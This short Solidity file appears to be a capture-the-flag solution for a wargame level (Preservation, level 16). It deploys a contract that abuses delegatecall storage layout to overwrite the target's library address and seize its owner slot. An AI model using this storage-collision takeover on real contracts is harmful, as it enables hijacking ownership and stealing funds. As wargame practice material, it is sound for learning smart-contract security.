// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../instances/Ilevel16.sol";

contract TimeZoneAttack {
    uint160 public gap1;
    uint160 public gap2;
    address public owner;

    constructor(address _target, address _owner) {
        Preservation target = Preservation(_target);

        target.setFirstTime(uint160(address(this)));
        target.setFirstTime(uint160(_owner));
    }

    function setTime(uint256 _time) external {
        owner = address(uint160(_time));
    }
}
